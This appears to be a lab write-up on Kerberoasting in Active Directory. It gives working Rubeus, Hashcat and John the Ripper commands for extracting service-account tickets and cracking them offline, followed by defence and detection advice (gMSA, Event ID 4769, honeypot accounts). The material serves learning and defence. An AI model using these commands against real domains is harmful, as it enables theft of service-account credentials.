# Kerberoasting

## Objective

Kerberos uses Service Principal Names (SPNs) to link service instances to logon accounts, allowing client applications to request authentication without knowing the account name. Kerberoasting exploits this by obtaining a Ticket Granting Service (TGS) ticket, which is encrypted with the service account's NTLM hash, and then performing offline password cracking.

### Skills Learned

- Active Directory
- Domain Policy
- Domain Functional Levels
- Password Policy
- Kerberos Delegation

### Tools Used

- Windows Server DC
- PKI
- Kali Linux
- Rubeus
- Hashcat
- Event Viewer

## Exploit
  Rubeus can be used to obtain crackable tickets.
  ```
  Rubeus.exe kerberoast /outfile:spn.txt
  ```
  ![image](https://github.com/user-attachments/assets/a1dd7db9-d75c-4c1c-89d8-73fc78928428)

Once the tickets are obtained then it's time to crack them.  We can use two tools for this:
  - Hashcat
  - JackTheRipper

#### Hashcat
  This is possible using mode (-m) 13100 for a Kerberoastable TGS (Ticket Granting Service).
  
  ``` hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt``` -- If hashcat gives an error the option.
  ```--force``` may be necessary.
  
  Once Hashcat finishes cracking, the output will show the password in plain text:

![image](https://github.com/user-attachments/assets/08612ccd-b5d7-4c6b-a162-60c66bbc61b7)

  

#### John The Ripper
  Captured TGS hashes can be cracked just the same:
  ```
  sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot
  ```

## Defending

  - Limits SPN usage and disable those no longer needed/used.
  - Strong passwords are required (100+ characters)
  - Use Group Managed Service Accounts (GMSA) whenever possible.

## Detection

  -  Event ID 4769 should return the following useful information:
    ![image](https://github.com/user-attachments/assets/61991542-10d9-4dbd-91c8-242504c342db)
  - A honeypot account 2+ years old with a difficult to break password is a perfect detection option in an AD environment.
  - Assign some privs to make the account interesting and must have an SPn registered.
  - ANY activity in this account, successful or not, is suspicious and should be alerted. 
